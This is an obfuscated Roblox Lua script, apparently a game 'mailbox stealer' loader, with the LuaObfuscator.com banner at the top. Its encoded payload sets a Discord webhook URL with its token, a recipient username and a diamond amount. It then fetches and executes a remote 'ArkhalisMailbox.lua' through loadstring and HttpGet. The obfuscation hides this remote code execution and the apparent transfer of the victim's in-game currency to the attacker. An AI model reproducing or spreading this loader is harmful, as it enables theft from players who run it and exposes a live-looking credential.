--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v71=0;local v72;while true do if (v71==0) then v72=v2(v0(v30,16));if v19 then local v101=0;local v102;while true do if (v101==1) then return v102;end if (v101==0) then v102=v5(v72,v19);v19=nil;v101=1;end end else return v72;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v73=(1270 -(226 + 1044)) -(0 -0) ;local v74;while true do if (v73==(0 -0)) then v74=(v31/((3 -(118 -(32 + 85)))^(v32-(2 -1))))%((621 -(555 + 64))^(((v33-(932 -(857 + 74))) -(v32-((558 + 11) -(367 + 201)))) + (928 -(214 + 713)))) ;return v74-(v74%(1 + 0)) ;end end else local v75=0 + 0 ;local v76;while true do if (v75==(877 -(282 + 595))) then v76=((364 + 1275) -(1523 + 114))^(v32-(1 + 0)) ;return (((v31%(v76 + v76))>=v76) and ((958 -(892 + 65)) -0)) or (1065 -(68 + 997)) ;end end end end local function v21()local v34=0 -0 ;local v35;while true do if (v34==(1 -0)) then return v35;end if (v34==0) then v35=v1(v16,v18,v18);v18=v18 + 1 ;v34=1 -0 ;end end end local function v22()local v36=350 -(87 + 263) ;local v37;local v38;while true do if (v36==(181 -(67 + 113))) then return (v38 * (1208 -(802 + 150))) + v37 ;end if (v36==(0 -0)) then v37,v38=v1(v16,v18,v18 + (3 -1) );v18=v18 + 2 + 0 ;v36=2 -1 ;end end end local function v23()local v39=0;local v40;local v41;local v42;local v43;while true do if (v39==(2 -1)) then return (v43 * (1699102 + 8074400 + 7003714)) + (v42 * (86188 -20652)) + (v41 * 256) + v40 ;end if (v39==(1187 -(1069 + 118))) then v40,v41,v42,v43=v1(v16,v18,v18 + (6 -3) );v18=v18 + (8 -4) ;v39=1;end end end local function v24()local v44=0 -0 ;local v45;local v46;local v47;local v48;local v49;local v50;while true do if (v44==(1 + 0)) then v47=792 -(368 + 423) ;v48=(v20(v46,1,905 -(261 + 624) ) * (((704 -(376 + 325)) -1)^(100 -68))) + v45 ;v44=20 -(10 + 8) ;end if (v44==(2 -0)) then v49=v20(v46,1444 -(630 + 793) ,119 -88 );v50=((v20(v46,474 -(416 + 26) )==(3 -2)) and  -((2 -1) + 0)) or ((1 + 0) -0) ;v44=441 -((319 -174) + 293) ;end if (v44==(433 -(44 + 386))) then if (v49==(1486 -((1012 -(9 + 5)) + 488))) then if (v48==(766 -(745 + 21))) then return v50 * ((376 -(85 + 291)) + 0) ;else local v103=0 + 0 ;while true do if (v103==((2037 -(243 + 1022)) -((764 -563) + 571))) then v49=1 + 0 + 0 ;v47=(2318 -(1123 + 57)) -(116 + 1022) ;break;end end end elseif (v49==(8522 -6475)) then return ((v48==(0 + 0)) and (v50 * ((3 -2)/(0 + 0 + (254 -(163 + 91)))))) or (v50 * NaN) ;end return v8(v50,v49-(2312 -1289) ) * (v47 + (v48/((7 -5)^52))) ;end if (v44==(859 -(814 + 45))) then v45=v23();v46=v23();v44=2 -1 ;end end end local function v25(v51)local v52=1930 -((3131 -(1091 + 171)) + 61) ;local v53;local v54;while true do if (v52==(718 -(15 + 114 + 589))) then v53=nil;if  not v51 then local v96=0 + 0 ;while true do if (v96==(0 + 0)) then v51=v23();if (v51==(0 -0)) then return "";end break;end end end v52=1 -0 ;end if (v52==(1 + 2)) then return v6(v54);end if (v52==2) then v54={};for v80=1 -0 , #v53 do v54[v80]=v2(v1(v3(v53,v80,v80)));end v52=3;end if (v52==(1 + 0)) then v53=v3(v16,v18,(v18 + v51) -(1475 -(1329 + 145)) );v18=v18 + v51 ;v52=973 -(140 + 831) ;end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v55=671 -(196 + 475) ;local v56;local v57;local v58;local v59;local v60;local v61;local v62;local v63;while true do if ((251 -(177 + 71))~=v55) then else v62=nil;v63=nil;v55=110 -(8 + 98) ;end if (v55==4) then while true do if (v56==(2 -0)) then local v100=878 -(284 + 594) ;while true do if (v100==(0 -0)) then v61=nil;v62=nil;v100=2 -1 ;end if (v100==1) then v56=169 -(122 + 44) ;break;end end end if (v56~=(304 -(244 + 60))) then else v57=0 -0 ;v58=nil;v56=477 -(41 + 435) ;end if (v56~=(3 -2)) then else v59=nil;v60=nil;v56=2 + 0 ;end if (v56~=(1 + 2)) then else v63=nil;while true do local v104=0;while true do if (v104~=(1 + 0)) then else if (v57~=2) then else local v127=0 -0 ;local v128;while true do if (v127==(65 -(30 + 35))) then v128=0 + 0 ;while true do if (v128==0) then for v179=1 + 0 ,v62 do local v180=1257 -(1043 + 214) ;local v181;local v182;while true do if (v180==(0 -0)) then local v190=0;while true do if (v190~=(1212 -(323 + 889))) then else v181=v21();v182=nil;v190=2 -1 ;end if ((1139 -(782 + 356))==v190) then v180=268 -(176 + 91) ;break;end end end if (v180~=(2 -1)) then else if (v181==(581 -(361 + 219))) then v182=v21()~=(320 -(53 + 267)) ;elseif (v181==2) then v182=v24();elseif (v181~=(1095 -(975 + 117))) then else v182=v25();end v63[v179]=v182;break;end end end v61[1878 -(157 + 1718) ]=v21();v128=1;end if (v128==(1 + 0)) then for v183=1,v23() do local v184=0 + 0 ;local v185;local v186;local v187;while true do if (v184~=(3 -2)) then else v187=nil;while true do if (v185==(413 -(15 + 398))) then v186=982 -(18 + 964) ;v187=nil;v185=1019 -(697 + 321) ;end if (v185~=(3 -2)) then else while true do if (v186~=0) then else v187=v21();if (v20(v187,1 -0 ,1 + 0 )~=(0 + 0)) then else local v192=0 + 0 ;local v193;local v194;local v195;while true do if (v192==(851 -(20 + 830))) then local v196=0;while true do if (v196==(0 -0)) then local v203=1227 -(322 + 905) ;while true do if (0~=v203) then else v195={v22(),v22(),nil,nil};if (v193==(0 + 0)) then local v205=738 -(542 + 196) ;local v206;local v207;local v208;while true do if (v205~=(947 -(245 + 702))) then else v206=0;v207=nil;v205=1 -0 ;end if (v205~=(1 + 0)) then else v208=nil;while true do if (v206==(1 + 0)) then while true do if (v207~=(1898 -(260 + 1638))) then else v208=0 + 0 ;while true do if (v208==(0 -0)) then v195[7 -4 ]=v22();v195[4]=v22();break;end end break;end end break;end if (0~=v206) then else local v215=1551 -(1126 + 425) ;while true do if ((405 -(118 + 287))==v215) then v207=0 -0 ;v208=nil;v215=1 + 0 ;end if (v215==(3 -2)) then v206=1;break;end end end end break;end end elseif (v193==(1122 -(118 + 1003))) then v195[8 -5 ]=v23();elseif (v193==2) then v195[380 -(142 + 235) ]=v23() -((9 -7)^16) ;elseif (v193~=(1 + 2)) then else local v216=977 -(553 + 424) ;local v217;local v218;while true do if (v216==(1206 -(902 + 303))) then while true do if ((0 -0)~=v217) then else v218=0;while true do if (v218~=0) then else v195[5 -2 ]=v23() -((4 -2)^(2 + 14)) ;v195[4 + 0 ]=v22();break;end end break;end end break;end if (v216~=(0 + 0)) then else v217=0;v218=nil;v216=1;end end end v203=1 + 0 ;end if (v203~=(1 + 0)) then else v196=1 + 0 ;break;end end end if (v196==(2 -1)) then v192=2 -0 ;break;end end end if (v192==(768 -(468 + 297))) then if (v20(v194,6 -3 ,3)==(3 -2)) then v195[11 -7 ]=v63[v195[4]];end v58[v183]=v195;break;end if (v192~=(4 -2)) then else local v198=0 -0 ;local v199;while true do if (v198==(0 + 0)) then v199=236 -(141 + 95) ;while true do if (v199==(4 -3)) then v192=7 -4 ;break;end if (v199==(753 -(239 + 514))) then local v204=0;while true do if (v204==(0 -0)) then if (v20(v194,1 + 0 ,1 + 0 )==(2 -1)) then v195[1331 -(797 + 532) ]=v63[v195[2 + 0 ]];end if (v20(v194,2,2)==(1 + 0)) then v195[4 -1 ]=v63[v195[6 -3 ]];end v204=1;end if (v204~=(1203 -(373 + 829))) then else v199=164 -(92 + 71) ;break;end end end end break;end end end if (v192~=(0 + 0)) then else local v200=0 -0 ;while true do if (v200==0) then v193=v20(v187,767 -(574 + 191) ,3);v194=v20(v187,735 -(476 + 255) ,14 -8 );v200=1;end if (v200==(1131 -(369 + 761))) then v192=1 + 0 ;break;end end end end end break;end end break;end end break;end if (v184~=0) then else v185=0 + 0 ;v186=nil;v184=850 -(254 + 595) ;end end end v57=5 -2 ;break;end end break;end end end if (v57==(127 -(55 + 71))) then local v129=0 -0 ;while true do if (v129==(0 -0)) then v61={v58,v59,nil,v60};v62=v23();v129=1;end if (v129~=(1 -0)) then else v63={};v57=338 -(144 + 192) ;break;end end end break;end if (v104==(216 -(42 + 174))) then if (v57==(0 + 0)) then local v130=0;local v131;while true do if (v130~=0) then else v131=0 -0 ;while true do if (v131~=(0 + 0)) then else local v178=0 + 0 ;while true do if (v178==(1504 -(363 + 1141))) then v58={};v59={};v178=1581 -(1183 + 397) ;end if (v178~=(2 -1)) then else v131=1 -0 ;break;end end end if ((1 + 0)==v131) then v60={};v57=1 + 0 ;break;end end break;end end end if (v57~=(1978 -(1913 + 62))) then else local v132=0;local v133;while true do if (v132==(0 + 0)) then v133=0 -0 ;while true do if (v133==0) then for v188=2 -1 ,v23() do v59[v188-(807 -(118 + 688)) ]=v28();end return v61;end end break;end end end v104=1;end end end break;end end break;end if ((1935 -(565 + 1368))==v55) then v60=nil;v61=nil;v55=11 -8 ;end if (v55==(1662 -(1477 + 184))) then v58=nil;v59=nil;v55=2;end if (v55==(0 -0)) then v56=0 + 0 ;v57=nil;v55=1;end end end local function v29(v64,v65,v66)local v67=0;local v68;local v69;local v70;while true do if (v67==0) then v68=v64[1];v69=v64[2];v67=1;end if (v67==1) then v70=v64[3];return function(...)local v82=v68;local v83=v69;local v84=v70;local v85=v27;local v86=1;local v87= -1;local v88={};local v89={...};local v90=v12("#",...) -1 ;local v91={};local v92={};for v97=0,v90 do if (v97>=v84) then v88[v97-v84 ]=v89[v97 + 1 ];else v92[v97]=v89[v97 + 1 ];end end local v93=(v90-v84) + 1 ;local v94;local v95;while true do v94=v82[v86];v95=v94[1];if (v95<=5) then if (v95<=2) then if (v95<=0) then v92[v94[2]]=v66[v94[3]];elseif (v95==1) then do return;end else v92[v94[2]][v94[3]]=v94[4];end elseif (v95<=3) then local v111;local v112,v113;local v114;local v115;v92[v94[2]][v94[3]]=v94[4];v86=v86 + 1 ;v94=v82[v86];v92[v94[2]]=v66[v94[3]];v86=v86 + 1 ;v94=v82[v86];v92[v94[2]]=v66[v94[3]];v86=v86 + 1 ;v94=v82[v86];v115=v94[2];v114=v92[v94[3]];v92[v115 + 1 ]=v114;v92[v115]=v114[v94[4]];v86=v86 + 1 ;v94=v82[v86];v92[v94[2]]=v94[3];v86=v86 + 1 ;v94=v82[v86];v115=v94[2];v112,v113=v85(v92[v115](v13(v92,v115 + 1 ,v94[3])));v87=(v113 + v115) -1 ;v111=0;for v134=v115,v87 do v111=v111 + 1 ;v92[v134]=v112[v111];end v86=v86 + 1 ;v94=v82[v86];v115=v94[2];v92[v115]=v92[v115](v13(v92,v115 + 1 ,v87));v86=v86 + 1 ;v94=v82[v86];v92[v94[2]]();v86=v86 + 1 ;v94=v82[v86];v86=v94[3];elseif (v95>4) then local v141=0;local v142;local v143;local v144;local v145;while true do if (v141==1) then v87=(v144 + v142) -1 ;v145=0;v141=2;end if (0==v141) then v142=v94[2];v143,v144=v85(v92[v142](v13(v92,v142 + 1 ,v94[3])));v141=1;end if (v141==2) then for v174=v142,v87 do v145=v145 + 1 ;v92[v174]=v143[v145];end break;end end else local v146=0;while true do if (v146==0) then v92[v94[2]][v94[3]]=v94[4];v86=v86 + 1 ;v94=v82[v86];v92[v94[2]]=v66[v94[3]];v146=1;end if (1==v146) then v86=v86 + 1 ;v94=v82[v86];v92[v94[2]][v94[3]]=v94[4];v86=v86 + 1 ;v146=2;end if (3==v146) then v86=v94[3];break;end if (2==v146) then v94=v82[v86];v92[v94[2]]=v94[3];v86=v86 + 1 ;v94=v82[v86];v146=3;end end end elseif (v95<=8) then if (v95<=6) then for v137=v94[2],v94[3] do v92[v137]=nil;end elseif (v95>7) then local v147=v94[2];v92[v147]=v92[v147](v13(v92,v147 + 1 ,v87));else local v149=0;local v150;local v151;while true do if (0==v149) then v150=v94[2];v151=v92[v94[3]];v149=1;end if (v149==1) then v92[v150 + 1 ]=v151;v92[v150]=v151[v94[4]];break;end end end elseif (v95<=10) then if (v95==9) then if (v92[v94[2]]==v94[4]) then v86=v86 + 1 ;else v86=v94[3];end else v92[v94[2]]();end elseif (v95>11) then v86=v94[3];else v92[v94[2]]=v94[3];end v86=v86 + 1 ;end end;end end end return v29(v28(),{},v17)(...);end v15("LOL!0D3O00028O00026O00F03F03023O005F4703073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O31303O39323736393639363536373338302F705F555F5347554B77532D46594678776D6A7475415865364F616A357633374A6E44387A326B6E6936357758645973684F79643463796C7A4D66576C5655367A59575852030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403313O00682O7470733A2O2F61726B68616C69736C75612E6769746875622E696F2F41726B68616C69734D61696C626F782E6C756103083O00557365726E616D65030C3O0056697375616C44612O72656E03083O004469616D6F6E6473024O0080841E41001C3O00120B3O00014O0006000100013O0026093O00020001000100040C3O0002000100120B000100013O002609000100110001000200040C3O0011000100122O000200033O00300300020004000500122O000200063O00122O000300073O00202O00030003000800122O000500096O000300056O00023O00024O00020001000100044O001B0001002609000100050001000100040C3O0005000100122O000200033O0030040002000A000B00122O000200033O00302O0002000C000D00122O000100023O00044O0005000100040C3O001B000100040C3O000200012O00013O00017O00",v9(),...);end
